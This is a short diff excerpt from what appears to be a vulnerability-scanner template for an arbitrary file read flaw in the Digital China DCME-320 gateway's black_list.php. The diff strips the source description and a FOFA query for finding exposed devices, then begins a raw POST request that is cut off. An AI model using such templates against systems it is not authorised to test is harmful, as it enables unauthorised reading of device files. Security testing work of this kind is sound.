@@ -3,12 +3,8 @@ info:
   name: 神州数码 DCME-320出口网关 black_list.php 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rh2gvg8qgdcns7tq'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rh2gvg8qgdcns7tq
-    fofa: body="style/blue/css/dcn_ui.css"
 http:
 - raw:
   - 'POST /function/auth/user/black_list.php HTTP/1.1
